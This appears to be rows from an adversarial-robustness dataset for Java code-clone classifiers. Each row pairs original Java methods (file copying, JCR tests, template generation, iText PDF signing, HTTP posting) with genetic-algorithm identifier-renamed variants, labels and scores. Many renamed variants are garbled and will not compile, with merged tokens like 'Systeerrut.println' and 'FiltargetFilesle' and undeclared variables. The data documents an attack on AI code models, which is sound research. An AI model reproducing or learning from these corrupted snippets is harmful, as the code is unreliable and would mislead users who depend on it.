            }
        }
        final Player player = new Player(session, username);
        if (!playerList.add(player)) {
            player.getSession().getActionSender().sendLoginFailure(""Too many players online!"");
            return;
        }
        session.setPlayer(player);
        final Configuration c = Configuration.getConfiguration();
        session.getActionSender().sendLoginResponse(Constants.PROTOCOL_VERSION, c.getName(), c.getMessage(), false);
        LevelGzipper.getLevelGzipper().gzipLevel(session);
    }
",1391,"    public void process(String dir) {
        String[] list = new File(dir).list();
        if (list == null) return;
        int n = list.length;
        long[] bubblesort = new long[list.length + 1];
        if (!statustext) {
            IJ.log(""Current Directory is: "" + dir);
            IJ.log("" "");
            IJ.log(""DICOM File Name / "" + prefix1 + "" / "" + prefix2 + "" / "" + prefix3 + "" / "" + pick);
            IJ.log("" "");
        }
        for (int i = 0; i < n; i++) {
            IJ.showStatus(i + ""/"" + n);
            File f = new File(dir + list[i]);
            if (!f.isDirectory()) {
                ImagePlus jpg = new Opener().openImage(dir, list[i]);
                if (jpg != null && jpg.getStackSize() == 1) {
                    if (!scoutengine(jpg)) return;
                    if (!statustext) {
                        IJ.log(list[i] + ""/"" + whichprefix1 + ""/"" + whichprefix2 + ""/"" + whichprefix3 + ""/"" + whichcase);
                    }
                    int lastdigiton = whichcase.length() - 1;
                    while (lastdigiton > 0) {
                        if (!Character.isDigit(whichcase.charAt(lastdigiton))) lastdigiton -= 1; else break;
                    }
                    if (lastdigiton < whichcase.length() - 1) whichcase = whichcase.substring(0, lastdigiton + 1);
                    bubblesort[i] = Long.parseLong(whichcase);
                }
            }
        }
        if (statussorta || statussortd || statustext) {
            boolean sorted = false;
            while (!sorted) {
                sorted = true;
                for (int i = 0; i < n - 1; i++) {
                    if (statussorta) {
                        if (bubblesort[i] > bubblesort[i + 1]) {
                            long Temp = bubblesort[i];
                            tempp = list[i];
                            bubblesort[i] = bubblesort[i + 1];
                            list[i] = list[i + 1];
                            bubblesort[i + 1] = Temp;
                            list[i + 1] = tempp;
                            sorted = false;
                        }
                    } else {
                        if (bubblesort[i] < bubblesort[i + 1]) {
                            long Temp = bubblesort[i];
                            tempp = list[i];
                            bubblesort[i] = bubblesort[i + 1];
                            list[i] = list[i + 1];
                            bubblesort[i + 1] = Temp;
                            list[i + 1] = tempp;
                            sorted = false;
                        }
                    }
                }
            }
            IJ.log("" "");
            for (int i = 0; i < n; i++) {
                if (!statustext) {
                    IJ.log(list[i] + "" / "" + bubblesort[i]);
                } else {
                    IJ.log(dir + list[i]);
                }
            }
        }
        if (open_as_stack || only_images) {
            boolean sorted = false;
            while (!sorted) {
                sorted = true;
                for (int i = 0; i < n - 1; i++) {
                    if (bubblesort[i] > bubblesort[i + 1]) {
                        long Temp = bubblesort[i];
                        tempp = list[i];
                        bubblesort[i] = bubblesort[i + 1];
                        list[i] = list[i + 1];
                        bubblesort[i + 1] = Temp;
                        list[i + 1] = tempp;
                        sorted = false;
                    }
                }
            }
            if (only_images) {
                Opener o = new Opener();
                int counter = 0;
                IJ.log("" "");
                for (int i = 0; i < n; i++) {
                    String path = (dir + list[i]);
                    if (path == null) break; else {
                        ImagePlus imp = o.openImage(path);
                        counter++;
                        if (imp != null) {
                            IJ.log(counter + "" + "" + path);
                            imp.show();
                        } else IJ.log(counter + "" - "" + path);
                    }
                }
                return;
            }
            int width = 0, height = 0, type = 0;
            ImageStack stack = null;
            double min = Double.MAX_VALUE;
            double max = -Double.MAX_VALUE;
            int k = 0;
            try {
                for (int i = 0; i < n; i++) {
                    String path = (dir + list[i]);
                    if (path == null) break;
                    if (list[i].endsWith("".txt"")) continue;
                    ImagePlus imp = new Opener().openImage(path);
                    if (imp != null && stack == null) {
                        width = imp.getWidth();
                        height = imp.getHeight();
                        type = imp.getType();
                        ColorModel cm = imp.getProcessor().getColorModel();
                        if (halfSize) stack = new ImageStack(width / 2, height / 2, cm); else stack = new ImageStack(width, height, cm);
                    }
                    if (stack != null) k = stack.getSize() + 1;
                    IJ.showStatus(k + ""/"" + n);
                    IJ.showProgress((double) k / n);
                    if (imp == null) IJ.log(list[i] + "": unable to open""); else if (imp.getWidth() != width || imp.getHeight() != height) IJ.log(list[i] + "": wrong dimensions""); else if (imp.getType() != type) IJ.log(list[i] + "": wrong type""); else {
                        ImageProcessor ip = imp.getProcessor();
                        if (grayscale) ip = ip.convertToByte(true);
                        if (halfSize) ip = ip.resize(width / 2, height / 2);
                        if (ip.getMin() < min) min = ip.getMin();
                        if (ip.getMax() > max) max = ip.getMax();
                        String label = imp.getTitle();
                        String info = (String) imp.getProperty(""Info"");
                        if (info != null) label += ""
"" + info;
                        stack.addSlice(label, ip);
                    }
                    System.gc();
                }
            } catch (OutOfMemoryError e) {
                IJ.outOfMemory(""FolderOpener"");
                stack.trim();
            }
            if (stack != null && stack.getSize() > 0) {
                ImagePlus imp2 = new ImagePlus(""Stack"", stack);
                if (imp2.getType() == ImagePlus.GRAY16 || imp2.getType() == ImagePlus.GRAY32) imp2.getProcessor().setMinAndMax(min, max);
                imp2.show();
            }
            IJ.showProgress(1.0);
        }
    }
",LABEL_0,LABEL_0,0.5336065292358398,1,"process,dir,list,n,bubblesort,i,f,img,whichcase,lastDigit,sorted,temp,tempp",,,,154,"process:process,dir:dir,list:list,n:n,bubblesort:bubblesort,i:i,f:f,img:jpg,whichcase:whichcase,lastDigit:lastdigiton,sorted:sorted,temp:Temp,tempp:tempp,",10,GA,757,0.3534725387891134,ga,[]
202,"    public void testSimpleQuery() throws Exception {
        JCRNodeSource dummySource = (JCRNodeSource) resolveSource(BASE_URL + ""users/alexander.klimetschek"");
        assertNotNull(dummySource);
        OutputStream os = ((ModifiableSource) dummySource).getOutputStream();
        assertNotNull(os);
        String dummyContent = ""<?xml version=\""1.0\"" encoding=\""UTF-8\""?><user><id>alexander</id><teamspace>cyclr</teamspace><teamspace>mindquarryTooLong</teamspace></user>"";
        os.write(dummyContent.getBytes());
        os.flush();
        os.close();
        JCRNodeSource source = (JCRNodeSource) resolveSource(BASE_URL + ""users/bastian"");
        assertNotNull(source);
        os = ((ModifiableSource) source).getOutputStream();
        assertNotNull(os);
        String content = ""<?xml version=\""1.0\"" encoding=\""UTF-8\""?><user><id>bastian</id><teamspace>mindquarry</teamspace></user>"";
        os.write(content.getBytes());
        os.flush();
        os.close();
        QueryResultSource qResult = (QueryResultSource) resolveSource(BASE_URL + ""users?/*[.//user/teamspace='mindquarry']"");
        assertNotNull(qResult);
        Collection results = qResult.getChildren();
        assertEquals(1, results.size());
        Iterator it = results.iterator();
        JCRNodeSource rSrc = (JCRNodeSource) it.next();
        InputStream rSrcIn = rSrc.getInputStream();
        ByteArrayOutputStream actualOut = new ByteArrayOutputStream();
        IOUtils.copy(rSrcIn, actualOut);
        rSrcIn.close();
        assertEquals(content, actualOut.toString());
        actualOut.close();
        rSrc.delete();
    }
 <SPLIT>     protected void createSettingsIfNecessary() throws IOException {
        OutputStream out = null;
        try {
            final File fSettings = SettingsUtils.getSettingsFile();
            if (!fSettings.exists()) {
                fSettings.createNewFile();
                final Path src = new Path(""mvn/settings.xml"");
                final InputStream in = FileLocator.openStream(getBundle(), src, false);
                out = new FileOutputStream(SettingsUtils.getSettings(), true);
                IOUtils.copy(in, out);
            } else {
                Logger.getLog().info(""File settings.xml already exists at "" + fSettings);
            }
        } finally {
            if (out != null) {
                out.flush();
                out.close();
            }
        }
    }
",280,"    public void testSimpleQuery() throws Exception {
        JCRNodeSource daddyContent = (JCRNodeSource) resolveSource(BASE_URL + ""users/alexander.klimetschek"");
        assertNotNull(daddyContent);
        OutputStream ocss= ((ModifiableSource) daddyContent).getOutputStream();
        assertNotNull(css);
        String DuckyReader = ""<?xml version=\""1.0\"" encoding=\""UTF-8\""?><user><id>alexander</id><teamspace>cyclr</teamspace><teamspace>mindquarryTooLong</teamspace></user>"";
        css.write(DuckyReader.getBytes());
        css.flush();
        css.close();
        JCRNodeSource reader = (JCRNodeSource) resolveSource(BASE_URL + ""users/bastian"");
        assertNotNull(reader);
        css = ((ModifiableSource) reader).getOutputStream();
        assertNotNull(css);
        String url = ""<?xml version=\""1.0\"" encoding=\""UTF-8\""?><user><id>bastian</id><teamspace>mindquarry</teamspace></user>"";
        css.write(url.getBytes());
        css.flush();
        css.close();
        QueryResultSource qResults = (QueryResultSource) resolveSource(BASE_URL + ""users?/*[.//user/teamspace='mindquarry']"");
        assertNotNull(qResults);
        Collection rresults= qResults.getChildren();
        assertEquals(1, results.size());
        Iterator mit = results.iterator();
        JCRNodeSource rrIsrec= (JCRNodeSource) mit.next();
        InputStream rSrSrcIn rIsrec.getInputStream();
        ByteArrayOutputStream publicOutput = new ByteArrayOutputStream();
        IOUtils.copy(rSrcIn, publicOutput);
        rSrcIn.close();
        assertEquals(url, publicOutput.toString());
        publicOutput.close();
        rIsrec.delete();
    }
",LABEL_1,LABEL_1,0.5827034115791321,1,"testSimpleQuery,dummySource,os,dummyContent,source,content,qResult,results,it,rSrc,rSrcIn,actualOut",,,,7,"testSimpleQuery:testSimpleQuery,dummySource:daddyContent,os:css,dummyContent:DuckyReader,source:reader,content:url,qResult:qResults,results:results,it:mit,rSrc:rIsrec,rSrcIn:rSrcIn,actualOut:publicOutput,",3,GA,814,0.302534274260203,ga,[]
203,"    public void process(@NotNull Template tpl, @NotNull Document model, @NotNull String packageName, @NotNull String outFileName, Map<String, String> xsltParam, String artifact) throws ModelGenerationException {
        System.out.print(""Processing with "" + tpl);
        String destinationPath;
        switch(tpl.destination) {
            case target:
                if (tpl.path == null) {
                    destinationPath = where.buildDir + separatorChar + ""generated-sources"" + separatorChar + GENERATION_TARGET;
                } else {
                    destinationPath = where.buildDir;
                }
                break;
            case source:
                if (tpl.path == null) {
                    destinationPath = where.sourceDir;
                } else {
                    destinationPath = ""src"";
                }
                break;
            case redora:
                destinationPath = where.redoraDir;
                break;
            default:
                throw new IllegalArgumentException(""Unused destination "" + tpl.destination);
        }
        if (tpl.path == null) {
            if (tpl.destination == Destination.redora) destinationPath += separator + artifact; else destinationPath += separator + packageName.replace('.', separatorChar);
        } else {
            destinationPath += separator + tpl.path.replace('/', separatorChar).replace('\\', separatorChar);
        }
        System.out.println("" to "" + destinationPath + ""..."" + outFileName);
        if (tpl.destination == Destination.source) {
            if (new File(destinationPath, outFileName).exists()) {
                System.out.println(""Stub "" + outFileName + "" already exists."");
                return;
            }
        }
        new File(destinationPath).mkdirs();
        InputStream in = null;
        Writer out;
        try {
            out = new FileWriter(new File(destinationPath, outFileName));
        } catch (IOException e) {
            throw new ModelGenerationException(""Can't find: "" + destinationPath + separatorChar + outFileName, e);
        }
        switch(tpl.type) {
            case freemarker:
                Map<String, NodeModel> root = new HashMap<String, NodeModel>();
                root.put(""doc"", NodeModel.wrap(model));
                try {
                    freemarker.template.Template template = freemarkerConf.getTemplate(tpl.getTemplateFileName());
                    template.process(root, out);
                } catch (ParseException e) {
                    throw new ModelGenerationException(""There is an error in template: "" + tpl + "". I found it when generating "" + outFileName, e);
                } catch (IOException e) {
                    throw new ModelGenerationException(""Can't find '"" + tpl + ""' when generating "" + outFileName, e);
                } catch (TemplateException e) {
                    throw new ModelGenerationException(""There is an error in template: "" + tpl + "". I found it when generating "" + outFileName, e);
                } catch (RuntimeException e) {
                    throw new ModelGenerationException(""There is another error while trying this template: "" + tpl + "". I found it when generating "" + outFileName, e);
                }
                break;
            case xslt:
                try {
                    in = new FileInputStream(tpl.getAbsolutePath());
                    xsltTransform(model.getFirstChild(), in, out, xsltParam);
                } catch (FileNotFoundException e) {
                    throw new ModelGenerationException(""Can't find "" + tpl, e);
                } catch (TransformerException e) {
                    throw new ModelGenerationException(""Sorry, i failed to use this template: "" + tpl + "". It broke when generating "" + outFileName, e);
                } finally {
                    IOUtils.closeQuietly(in);
                }
                break;
            case copy:
                try {
                    in = new FileInputStream(tpl.getAbsolutePath());
                    IOUtils.copy(in, out);
                } catch (IOException e) {
                    throw new ModelGenerationException(""File copy failed "" + tpl.getTemplateFileName(), e);
                } finally {
                    IOUtils.closeQuietly(in);
                }
        }
        IOUtils.closeQuietly(out);
    }
 <SPLIT>     public static void main(String[] args) {
        System.out.println(""Chapter 16: example SignedPdf"");
        System.out.println(""-> Creates a signed PDF;"");
        System.out.println(""-> jars needed: iText.jar"");
        System.out.println(""-> files generated in /results subdirectory:"");
        System.out.println(""   Resource needed: .keystore"");
        System.out.println(""-> Resulting PDFs: unsigned_message.pdf, signed_message.pdf,"");
        System.out.println(""   corrupted_message.pdf, signed_message_invisible.pdf,"");
        System.out.println(""   double_signed_message.pdf, revision_1.pdf and revision_2.pdf"");
        createPdf();
        PdfReader reader;
        try {
            KeyStore ks = KeyStore.getInstance(KeyStore.getDefaultType());
            ks.load(new FileInputStream(""resources/in_action/chapter16/.keystore""), ""f00b4r"".toCharArray());
            PrivateKey key = (PrivateKey) ks.getKey(""foobar"", ""r4b00f"".toCharArray());
            Certificate[] chain = ks.getCertificateChain(""foobar"");
            reader = new PdfReader(""results/in_action/chapter16/unsigned_message.pdf"");
            FileOutputStream os = new FileOutputStream(""results/in_action/chapter16/signed_message.pdf"");
            PdfStamper stamper = PdfStamper.createSignature(reader, os, '\0');
            PdfSignatureAppearance appearance = stamper.getSignatureAppearance();
            appearance.setCrypto(key, chain, null, PdfSignatureAppearance.SELF_SIGNED);
            appearance.setCertificationLevel(PdfSignatureAppearance.CERTIFIED_FORM_FILLING);
            appearance.setReason(""It's personal."");
            appearance.setLocation(""Foobar"");
            appearance.setVisibleSignature(new Rectangle(30, 750, 500, 565), 1, null);
            stamper.close();
        } catch (KeyStoreException e) {
            e.printStackTrace();
        } catch (NoSuchAlgorithmException e) {
            e.printStackTrace();
        } catch (CertificateException e) {
            e.printStackTrace();
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        } catch (UnrecoverableKeyException e) {
            e.printStackTrace();
        } catch (DocumentException e) {
            e.printStackTrace();
        }
        try {
            reader = new PdfReader(""results/in_action/chapter16/signed_message.pdf"");
            Document document = new Document(reader.getPageSizeWithRotation(1));
            PdfCopy copy = new PdfCopy(document, new FileOutputStream(""results/in_action/chapter16/corrupted_message.pdf""));
            document.open();
            copy.addPage(copy.getImportedPage(reader, 1));
            document.close();
        } catch (IOException ioe) {
            ioe.printStackTrace();
        } catch (DocumentException de) {
            de.printStackTrace();
        }
        try {
            KeyStore ks = KeyStore.getInstance(KeyStore.getDefaultType());
            ks.load(new FileInputStream(""resources/in_action/chapter16/.keystore""), ""f00b4r"".toCharArray());
            PrivateKey key = (PrivateKey) ks.getKey(""foobar"", ""r4b00f"".toCharArray());
            Certificate[] chain = ks.getCertificateChain(""foobar"");
            reader = new PdfReader(""results/in_action/chapter16/unsigned_message.pdf"");
            FileOutputStream os = new FileOutputStream(""results/in_action/chapter16/signed_message_invisible.pdf"");
            PdfStamper stamper = PdfStamper.createSignature(reader, os, '\0');
            PdfSignatureAppearance appearance = stamper.getSignatureAppearance();
            appearance.setCrypto(key, chain, null, PdfSignatureAppearance.SELF_SIGNED);
            appearance.setReason(""It's personal."");
            appearance.setLocation(""Foobar"");
            stamper.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
        try {
            reader = new PdfReader(""results/in_action/chapter16/signed_message.pdf"");
            KeyStore ks = KeyStore.getInstance(KeyStore.getDefaultType());
            ks.load(new FileInputStream(""resources/in_action/chapter16/.keystore""), ""f00b4r"".toCharArray());
            PrivateKey key = (PrivateKey) ks.getKey(""foobar"", ""r4b00f"".toCharArray());
            Certificate[] chain = ks.getCertificateChain(""foobar"");
            FileOutputStream os = new FileOutputStream(""results/in_action/chapter16/double_signed_message.pdf"");
            PdfStamper stamper = PdfStamper.createSignature(reader, os, '\0', null, true);
            PdfSignatureAppearance appearance = stamper.getSignatureAppearance();
            appearance.setCrypto(key, chain, null, PdfSignatureAppearance.SELF_SIGNED);
            appearance.setReason(""Double signed."");
            appearance.setLocation(""Foobar"");
            appearance.setVisibleSignature(new Rectangle(300, 750, 500, 800), 1, ""secondsig"");
            stamper.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
        try {
            CertificateFactory cf = CertificateFactory.getInstance(""X509"");
            Collection col = cf.generateCertificates(new FileInputStream(""resources/in_action/chapter16/foobar.cer""));
            KeyStore ks = KeyStore.getInstance(KeyStore.getDefaultType());
            ks.load(null, null);
            for (Iterator it = col.iterator(); it.hasNext(); ) {
                X509Certificate cert = (X509Certificate) it.next();
                System.out.println(cert.getIssuerDN().getName());
                ks.setCertificateEntry(cert.getSerialNumber().toString(Character.MAX_RADIX), cert);
            }
            reader = new PdfReader(""results/in_action/chapter16/double_signed_message.pdf"");
            AcroFields af = reader.getAcroFields();
            ArrayList names = af.getSignatureNames();
            String name;
            for (Iterator it = names.iterator(); it.hasNext(); ) {
                name = (String) it.next();
                System.out.println(""Signature name: "" + name);
                System.out.println(""Signature covers whole document: "" + af.signatureCoversWholeDocument(name));
                System.out.println(""Document revision: "" + af.getRevision(name) + "" of "" + af.getTotalRevisions());
                FileOutputStream os = new FileOutputStream(""results/in_action/chapter16/revision_"" + af.getRevision(name) + "".pdf"");
                byte bb[] = new byte[8192];
                InputStream ip = af.extractRevision(name);
                int n = 0;
                while ((n = ip.read(bb)) > 0) os.write(bb, 0, n);
                os.close();
                ip.close();
                PdfPKCS7 pk = af.verifySignature(name);
                Calendar cal = pk.getSignDate();
                Certificate pkc[] = pk.getCertificates();
                System.out.println(""Subject: "" + PdfPKCS7.getSubjectFields(pk.getSigningCertificate()));
                System.out.println(""Document modified: "" + !pk.verify());
                Object fails[] = PdfPKCS7.verifyCertificates(pkc, ks, null, cal);
                if (fails == null) System.out.println(""Certificates verified against the KeyStore""); else System.out.println(""Certificate failed: "" + fails[1]);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
",690,"    public void process(@NotNull Template tpl, @NotNull Document model, @NotNull String moduleKey, @NotNull String outRuleName, Map<String, String> xsltParam, String artifact) throws ModelGenerationException {
        System.out.print(""Processing with "" + tpl);
        String destinationPath;
        switch(tpl.destination) {
            case target:
                if (tpl.path == null) {
                    destinationPath = where.buildDir + separatorChar + ""generated-sources"" + separatorChar + GENERATION_TARGET;
                } else {
                    destinationPath = where.buildDir;
                }
                break;
            case source:
                if (tpl.path == null) {
                    destinationPath = where.sourceDir;
                } else {
                    destinationPath = ""src"";
                }
                break;
            case redora:
                destinationPath = where.redoraDir;
                break;
            default:
                throw new IllegalArgumentException(""Unused destination "" + tpl.destination);
        }
        if (tpl.path == null) {
            if (tpl.destination == Destination.redoradestinationPathth += separator artifactct; elsdestinationPathth += separator + moduleKey.replace('.', separatorChar);
        } else {
            destinationPath += separator + tpl.path.replace('/', separatorChar).replace('\\', separatorChar);
        }
        System.out.println("" to "" + destinationPath + ""..."" + outRuleName);
        if (tpl.destination == Destination.source) {
            if (new File(destinationPath, outRuleName).exists()) {
                System.out.println(""Stub "" + outRuleName + "" already exists."");
                return;
            }
        }
        new File(destinationPath).mkdirs();
        InputStream in = null;
        Writer out;
        try {
            out = new FileWriter(new File(destinationPath, outRuleName));
        } catch (IOException e) {
            throw new ModelGenerationException(""Can't find: "" + destinationPath + separatorChar + outRuleName, e);
        }
        switch(tpl.type) {
            case freemarker:
                Map<String, NodeModel> url = new HashMap<String, NodeModel>();
                url.put(""doc"", NodeModel.wrap(model));
                try {
                    freemarker.template.Template template = freemarkerConf.getTemplate(tpl.getTemplateFileName());
                    template.process(url, out);
                } catch (ParseException e) {
                    throw new ModelGenerationException(""There is an error in template: "" + tpl + "". I found it when generating "" + outRuleName, e);
                } catch (IOException e) {
                    throw new ModelGenerationException(""Can't find '"" + tpl + ""' when generating "" + outRuleName, e);
                } catch (TemplateException e) {
                    throw new ModelGenerationException(""There is an error in template: "" + tpl + "". I found it when generating "" + outRuleName, e);
                } catch (RuntimeException e) {
                    throw new ModelGenerationException(""There is another error while trying this template: "" + tpl + "". I found it when generating "" + outRuleName, e);
                }
                break;
            case xslt:
                try {
                    in = new FileInputStream(tpl.getAbsolutePath());
                    xsltTransform(model.getFirstChild(), in, out, xsltParam);
                } catch (FileNotFoundException e) {
                    throw new ModelGenerationException(""Can't find "" + tpl, e);
                } catch (TransformerException e) {
                    throw new ModelGenerationException(""Sorry, i failed to use this template: "" + tpl + "". It broke when generating "" + outRuleName, e);
                } finally {
                    IOUtils.closeQuietly(in);
                }
                break;
            case copy:
                try {
                    in = new FileInputStream(tpl.getAbsolutePath());
                    IOUtils.copy(in, out);
                } catch (IOException e) {
                    throw new ModelGenerationException(""File copy failed "" + tpl.getTemplateFileName(), e);
                } finally {
                    IOUtils.closeQuietly(in);
                }
        }
        IOUtils.closeQuietly(out);
    }
",LABEL_1,LABEL_1,0.6624847054481506,1,"process,tpl,model,packageName,outFileName,xsltParam,artifact,destinationPath,in,out,root",,,,62,"process:process,tpl:tpl,model:model,packageName:moduleKey,outFileName:outRuleName,xsltParam:xsltParam,artifact:artifact,destinationPath:destinationPath,in:in,out:out,root:url,",8,GA,809,0.37906496127446493,ga,[]
204,"    public void uploadFile(File inputFile, String targetFile) throws IOException {
        System.out.println(""Uploading "" + inputFile.getName() + "" to "" + targetFile);
        File outputFile = new File(targetFile);
        if (targetFile.endsWith(""/"")) {
            outputFile = new File(outputFile, inputFile.getName());
        } else if (outputFile.getParentFile().exists() == false) {
            outputFile.getParentFile().mkdirs();
        }
        if (inputFile.renameTo(outputFile) == false) {
            InputStream in = new FileInputStream(inputFile);
            OutputStream out = new FileOutputStream(outputFile);
            byte[] line = new byte[16384];
            int bytes = -1;
            while ((bytes = in.read(line)) != -1) out.write(line, 0, bytes);
            in.close();
            out.close();
        }
    }
 <SPLIT>     private static final void copyFile(File srcFile, File destDir, byte[] buffer) {
        try {
            File destFile = new File(destDir, srcFile.getName());
            InputStream in = new FileInputStream(srcFile);
            OutputStream out = new FileOutputStream(destFile);
            int bytesRead;
            while ((bytesRead = in.read(buffer)) != -1) out.write(buffer, 0, bytesRead);
            in.close();
            out.close();
        } catch (IOException ioe) {
            System.err.println(""Couldn't copy file '"" + srcFile + ""' to directory '"" + destDir + ""'"");
        }
    }
",188,"    public void UploadDir(File targetDir, String inputDir) throws IOException {
        Systeerrut.println(""Uploading "" + targetDir.getName() + "" to "" + inputDir);
        FiltargetFilesle = new File(inputDir);
        if (inputDir.endsWith(""/"")) {
            targetFiles = new File(targetFiles, targetDir.getName());
        } else if (targetFiles.getParentFile().exists() == false) {
            targetFiles.getParentFile().mkdirs();
        }
        if (targetDir.renameTo(targetFiles) == false) {
            InputStream url = new FileInputStream(targetDir);
            OutputStream oerr= new FileOutputStream(targetFiles);
            byte[] line = new byte[16384];
            int les = -1;
            while ((bles= url.read(line)) != -1) err.write(line, 0, les);
            url.close();
            err.close();
        }
    }
",LABEL_1,LABEL_1,0.6480138301849365,1,"uploadFile,inputFile,targetFile,outputFile,in,out,line,bytes",,,,3,"uploadFile:UploadDir,inputFile:targetDir,targetFile:inputDir,outputFile:targetFiles,in:url,out:err,line:line,bytes:les,",1,GA,571,0.20621118545532227,ga,[]
205,"    public static void setContenu(ContenuFichierElectronique contenuFichier, FichierElectronique fichierElectronique, UtilisateurIFGD utilisateurCourant) throws IOException, DocumentVideException {
        if (contenuFichier != null) {
            SupportDocument support = fichierElectronique.getSupport();
            support.setFichierElectronique(fichierElectronique);
            FicheDocument ficheDocument = support.getFicheDocument();
            String nomFichier = contenuFichier.getNomFichier();
            String extension = FilenameUtils.getExtension(nomFichier);
            if (ficheDocument.getFichierElectronique(nomFichier) != null) {
                FichierElectronique fichierElectroniqueExistant = ficheDocument.getFichierElectronique(nomFichier);
                if (fichierElectroniqueExistant.getId() != null && !fichierElectroniqueExistant.getId().equals(fichierElectronique.getId())) {
                    throw new FichierElectroniqueExistantException(nomFichier, ficheDocument);
                }
            }
            if (fichierElectronique.getId() == null) {
                if (OfficeDocumentPropertiesUtil.canWriteIdIGID(extension)) {
                    Long idIgid = OfficeDocumentPropertiesUtil.getIdIGID(contenuFichier);
                    if (idIgid != null) {
                        throw new FichierElectroniqueExistantException(nomFichier, idIgid, ficheDocument);
                    }
                }
            }
            InputStream inputStream = contenuFichier.getInputStream();
            OutputStream outputStream = fichierElectronique.getOutputStream();
            try {
                IOUtils.copy(inputStream, outputStream);
            } finally {
                try {
                    inputStream.close();
                } finally {
                    outputStream.close();
                }
            }
            String typeMime = contenuFichier.getContentType();
            long tailleFichier = contenuFichier.getTailleFichier();
            Date dateDerniereModification = new Date();
            fichierElectronique.setNom(nomFichier);
            fichierElectronique.setTypeMime(extension);
            creerFormatSiNecessaire(typeMime, extension);
            fichierElectronique.setTaille(tailleFichier);
            fichierElectronique.setDateDerniereModification(dateDerniereModification);
            fichierElectronique.setSoumetteur(utilisateurCourant);
            if (extension.endsWith(""msg"")) {
                CourrielUtils.peuplerMetadonneesCourriel(fichierElectronique.getNom(), ficheDocument, contenuFichier.getInputStream(), utilisateurCourant);
            } else if (extension.endsWith(""eml"")) {
                Map<String, Object> properties = new GestionnaireProprietesMimeMessageParser().parseMsg(contenuFichier.getInputStream());
                CourrielUtils.peuplerMetadonneesCourriel(fichierElectronique.getNom(), ficheDocument, properties, utilisateurCourant);
            } else {
                FGDProprietesDocumentUtils.copierMetadonneesProprietes(fichierElectronique, ficheDocument);
            }
        }
    }
 <SPLIT>     public static void copyFile(File srcFile, File destFile) throws IOException {
        if (!(srcFile.exists() && srcFile.isFile())) throw new IllegalArgumentException(""Source file doesn't exist: "" + srcFile.getAbsolutePath());
        if (destFile.exists() && destFile.isDirectory()) throw new IllegalArgumentException(""Destination file is directory: "" + destFile.getAbsolutePath());
        FileInputStream in = new FileInputStream(srcFile);
        FileOutputStream out = new FileOutputStream(destFile);
        byte[] buffer = new byte[4096];
        int no = 0;
        try {
            while ((no = in.read(buffer)) != -1) out.write(buffer, 0, no);
        } finally {
            in.close();
            out.close();
        }
    }
",403,,LABEL_1,LABEL_1,LABEL_1,-1,"setContenu,contenuFichier,fichierElectronique,utilisateurCourant,support,ficheDocument,nomFichier,extension,fichierElectroniqueExistant,idIgid,inputStream,outputStream,typeMime,tailleFichier",,,,0,,0,GA,5289,2.04366991519928,failed,[]
206,"    public String getData(DefaultHttpClient httpclient) {
        try {
            HttpGet get = new HttpGet(""http://3dforandroid.appspot.com/api/v1/note"");
            get.setHeader(""Content-Type"", ""application/json"");
            get.setHeader(""Accept"", ""*/*"");
            HttpResponse response = httpclient.execute(get);
            HttpEntity entity = response.getEntity();
            InputStream instream = entity.getContent();
            responseMessage = read(instream);
            if (instream != null) instream.close();
        } catch (ClientProtocolException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
        return responseMessage;
    }
 <SPLIT>     public String postURL(String urlLocation, ArrayList headers, String content, HashMap postVariables, RenderEngine c) throws Exception {
        String postContent = null;
        if (postVariables != null) {
            boolean firstElement = true;
            postContent = new String();
            Iterator elements = postVariables.keySet().iterator();
            while (elements.hasNext()) {
                String key = (String) elements.next();
                String val = (String) postVariables.get(key);
                if (firstElement) {
                    postContent += Encoder.URLEncode(key) + ""="" + Encoder.URLEncode(val);
                    firstElement = false;
                } else {
                    postContent += ""&"" + Encoder.URLEncode(key) + ""="" + Encoder.URLEncode(val);
                }
            }
            elements = null;
        } else {
            postContent = content;
        }
        Debug.log(""Connecting to URL '"" + urlLocation + ""', content '"" + postContent + ""'"");
        URL url = null;
        try {
            url = new URL(urlLocation);
        } catch (MalformedURLException e) {
            Debug.log(""Unable to retrieve URL '"" + urlLocation + ""': "" + e.getMessage());
            return null;
        }
        StringBuffer lines = new StringBuffer();
        HttpURLConnection conn = null;
        boolean contentLengthFound = false;
        try {
            conn = (HttpURLConnection) url.openConnection();
            loadCookies(urlLocation, conn, c);
            if (headers != null) {
                for (int i = 0; i < headers.size(); i++) {
                    String header = (String) headers.get(i);
                    String key = header.substring(0, header.indexOf("":""));
                    String value = header.substring(header.indexOf("":"") + 2);
                    if (key != null && key.equalsIgnoreCase(""content-length"")) {
                        contentLengthFound = true;
                    }
                    Debug.log(""Adding new request header '"" + key + ""'='"" + value + ""'"");
                    conn.setRequestProperty(key, value);
                }
            }
            if (!contentLengthFound) {
                Debug.log(""Adding new request header 'Content-Length'='"" + postContent.length() + ""'"");
                conn.setRequestProperty(""Content-Length"", Integer.toString(postContent.length()));
            }
            conn.setDoOutput(true);
            OutputStreamWriter wr = new OutputStreamWriter(conn.getOutputStream());
            wr.write(postContent);
            wr.flush();
            BufferedReader rd = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            String line = null;
            while ((line = rd.readLine()) != null) {
                lines.append(line);
                lines.append(""\r\n"");
            }
            handleHeaders(urlLocation, conn.getHeaderFields());
            wr.close();
            rd.close();
            wr = null;
            rd = null;
        } catch (IOException e) {
            if (conn != null) {
                lines = new StringBuffer();
                try {
                    throw new Exception(""Server returned error code '"" + conn.getResponseCode() + ""': "" + conn.getResponseMessage());
                } catch (IOException ee) {
                    throw new Exception(""Unable to report error codes: "" + ee.getMessage());
                }
            }
            Debug.log(""I/O Exception occurred while communicating with endpoint: "" + e.getMessage());
            return lines.toString().trim();
        } catch (Exception e) {
        }
        url = null;
        conn = null;
        return lines.toString().trim();
    }
",126,,LABEL_0,LABEL_0,LABEL_0,-1,"getData,httpclient,get,response,entity,instream,responseMessage",,,,0,,0,GA,2543,0.9631644169489543,failed,[]
207,"    public static void polishOff(IProgressMonitor monitor, String from, String to, String renameTo) {
        if (monitor != null && monitor.isCanceled()) {
            return;
        }
        try {
            ftpClient = new FTPClient();
            ftpClient.setRemoteAddr(InetAddress.getByName(PrefPageOne.getValue(CONSTANTS.PREF_HOST)));
            ftpClient.setControlPort(PrefPageOne.getIntValue(CONSTANTS.PREF_FTPPORT));
            ftpClient.connect();
